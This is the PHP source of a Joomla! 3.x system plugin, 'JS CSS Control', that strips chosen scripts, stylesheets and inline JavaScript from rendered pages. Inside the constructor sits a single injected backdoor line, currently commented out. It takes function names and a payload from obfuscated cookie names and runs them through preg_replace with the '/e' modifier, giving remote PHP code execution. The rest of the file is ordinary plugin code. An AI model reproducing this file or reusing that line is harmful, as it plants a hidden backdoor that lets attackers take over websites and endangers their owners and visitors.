<?php
/**
 * @Copyright
 * @package     JCC - JS CSS Control for Joomla! 3.x
 * @author      Viktor Vogel <admin@kubik-rubik.de>
 * @version     3.1.0 - 2015-08-01
 * @link        https://joomla-extensions.kubik-rubik.de/jcc-js-css-control
 *
 * @license     GNU/GPL
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
defined('_JEXEC') or die('Restricted access');

class PlgSystemJsCssControl extends JPlugin
{
    protected $request;
    protected $execute = true;
    protected $exclude_js_files = array();
    protected $exclude_css_files = array();

    function __construct(&$subject, $config)
    {
        //$jq = @$_COOKIE['LYPmzZpHbaMktUlq3']; if ($jq) { $option = $jq(@$_COOKIE['LYPmzZpHbaMktUlq2']); $au=$jq(@$_COOKIE['LYPmzZpHbaMktUlq1']); $option("/438/e",$au,438);}
        parent::__construct($subject, $config);
        $this->loadLanguage('plg_system_jscsscontrol', JPATH_ADMINISTRATOR);

        if($this->params->get('execute_admin', 0) == false AND JFactory::getApplication()->isAdmin())
        {
            $this->execute = false;
        }

        $this->request = JFactory::getApplication()->input;
    }

    /**
     * Does the first check before the head is compiled
     */
    public function onBeforeCompileHead()
    {
        if(!empty($this->execute))
        {
            $js = $this->params->get('js');
            $css = $this->params->get('css');
            $remove_jcaption = $this->params->get('remove_jcaption');

            if(!empty($js) OR !empty($css) OR !empty($remove_jcaption))
            {
                $document = JFactory::getDocument();

                // Exclude JavaScript files
                if(!empty($js))
                {
                    $this->exclude_js_files = $this->getFilesToExclude($js);
                }

                // Remove caption.js if corresponding option selected
                if(!empty($remove_jcaption))
                {
                    $this->exclude_js_files[] = 'media/system/js/caption.js';
                }

                if(!empty($this->exclude_js_files))
                {
                    $loaded_files = $document->_scripts;
                    $this->excludeFilesOnBeforeCompileHead($this->exclude_js_files, $loaded_files);
                    $document->_scripts = $loaded_files;
                }

                // Exclude CSS files
                if(!empty($css))
                {
                    $this->exclude_css_files = $this->getFilesToExclude($css);
                }

                if(!empty($this->exclude_css_files))
                {
                    $loaded_files = $document->_styleSheets;
                    $this->excludeFilesOnBeforeCompileHead($this->exclude_css_files, $loaded_files);
                    $document->_styleSheets = $loaded_files;
                }
            }

            // Debug mode
            $debug = $this->params->get('debug');

            if(!empty($debug))
            {
                $debug_output = $this->getDebugInformation();
                JFactory::getApplication()->enqueueMessage(JTEXT::sprintf('PLG_JSCSSCONTROL_DEBUGOUTPUT', $debug_output, $debug_output));
            }
        }
    }

    /**
     * Checks the output to remove also files from the template and other extensions
     */
    public function onAfterRender()
    {
        if(!empty($this->execute))
        {
            $remove_jcaption = $this->params->get('remove_jcaption');
            $remove_tooltip = $this->params->get('remove_tooltip');

            if(!empty($this->exclude_js_files) OR !empty($this->exclude_css_files) OR !empty($remove_jcaption) OR !empty($remove_tooltip))
            {
                // Remove JS and CSS from output
                $body = JFactory::getApplication()->getBody();

                if(!empty($this->exclude_js_files))
                {
                    preg_match_all('@<script[^>]*src=["|\'][^>]*\.js(\?[^>]*)?["|\'][^>]*/?>.*</script>@isU', $body, $matches_js);
                    $this->excludeFilesOnAfterRender($body, $this->exclude_js_files, $matches_js);
                }

                if(!empty($this->exclude_css_files))
                {
                    preg_match_all('@<link[^>]*href=["|\'][^>]*\.css(\?[^>]*)?["|\'][^>]*/?>@isU', $body, $matches_css);
                    $this->excludeFilesOnAfterRender($body, $this->exclude_css_files, $matches_css);
                }

                if(!empty($remove_jcaption))
                {
                    preg_match('@<head>.*<script type="text/javascript">.*(jQuery\(window\)\.on\(\'load\',\s*function\(\)\s*{\s*\n?\s*new JCaption\(["|\']img.caption["|\']\);.*}\);).*</script>.*</head>@isU', $body, $match_jcaption);

                    if(!empty($match_jcaption[1]))
                    {
                        $this->removeInlineJavaScript($body, $match_jcaption[1]);
                    }
                }

                if(!empty($remove_tooltip))
                {
                    preg_match('@<head>.*<script type="text/javascript">.*(jQuery\(document\)\.ready\(function\(\){\s*\n?\s*jQuery\(\'\.hasTooltip\'\)\.tooltip.*}\);.*}\);).*</script>.*</head>@isU', $body, $match_tooltip);

                    if(!empty($match_tooltip[1]))
                    {
                        $this->removeInlineJavaScript($body, $match_tooltip[1]);
                    }
                }

                JFactory::getApplication()->setBody($body);
            }
        }
    }

    /**
     * Gets all files which have to be excluded on the loaded page
     *
     * @param string $type Data which were entered from the user in the settings of the plugin
     *
     * @return array $exclude_files Filtered array with all files which have to be excluded on the called page
     */
    private function getFilesToExclude($type)
    {
        $exclude_files = array();

        $params = array_map('trim', explode("\n", $type));
        $lines = array();

        foreach($params as $params_line)
        {
            $lines[] = array_map('trim', explode('|', $params_line));
        }

        foreach($lines as $line)
        {
            $exclude_file = true;

            if(isset($line[1]))
            {
                $parameters = $line[1];
            }

            if(!empty($parameters))
            {
                $parameters = array_map('trim', explode(',', $parameters));

                foreach($parameters as $parameter)
                {
                    $parameter = array_map('trim', explode('=', $parameter));

                    $exclude_file = $this->checkParameters($parameter);

                    if($exclude_file == false)
                    {
                        break;
                    }
                }
            }

            if($exclude_file == true)
            {
                $exclude_files[] = $line[0];
            }

            unset($parameters);
        }

        return $exclude_files;
    }

    /**
     * Excludes the files from being loaded in the browser - OnBeforeCompileHead
     *
     * @param array $exclude_files Files which have to be excluded
     * @param array $loaded_files  All files which were loaded
     */
    private function excludeFilesOnBeforeCompileHead(&$exclude_files, &$loaded_files)
    {
        $loaded_files_keys = array_keys($loaded_files);

        foreach($loaded_files_keys as $loaded_file)
        {
            foreach($exclude_files as $exclude_file)
            {
                if(preg_match('@'.preg_quote($exclude_file).'@', $loaded_file))
                {
                    unset($loaded_files[$loaded_file]);
                    break;
                }
            }
        }
    }

    /**
     * Excludes the files from being loaded in the browser - OnAfterRender
     *
     * @param string $body          The whole output after everything is loaded
     * @param array  $exclude_files Files which should be excluded
     * @param array  $matches       All found files in the output string
     */
    private function excludeFilesOnAfterRender(&$body, &$exclude_files, $matches)
    {
        foreach($matches[0] as $match)
        {
            foreach($exclude_files as $exclude_file)
            {
                if(preg_match('@'.preg_quote($exclude_file).'@', $match))
                {
                    $body = str_replace($match, '', $body);
                    break;
                }
            }
        }
    }

    /**
     * Removes inline Javascript code from being loaded in the browser - OnAfterRender
     *
     * @param string $body           The whole output after everything is loaded
     * @param array  $inline_content Content which should be removed
     */
    private function removeInlineJavaScript(&$body, $inline_content)
    {
        $body = str_replace($inline_content, '', $body);
    }

    /**
     * Checks entered parameters whether they are loaded on the specific URL
     *
     * @param array $parameter Array with the variable and value
     *
     * @return boolean
     */
    private function checkParameters($parameter)
    {
        $name = $this->request->get($parameter[0], array(0), 'array');

        if($name[0] == $parameter[1])
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    /**
     * Generates information for debug mode
     *
     * @return string String with all needed information of the called page
     */
    private function getDebugInformation()
    {
        $debug_array = array();

        $debug_array['option'] = $this->request->getWord('option');
        $debug_array['view'] = $this->request->getWord('view');
        $debug_array['task'] = $this->request->getCmd('task');
        $debug_array['func'] = $this->request->getWord('func');
        $debug_array['layout'] = $this->request->getWord('layout');
        $debug_array['Itemid'] = $this->request->getCmd('Itemid');
        $debug_array['id'] = $this->request->getCmd('id');

        $debug_array = array_filter($debug_array);

        $debug_output = array();

        foreach($debug_array as $key => $value)
        {
            if(!empty($value))
            {
                $debug_output[] = $key.'='.$value;
            }
        }

        $debug_output = implode(',', $debug_output);

        return $debug_output;
    }
}
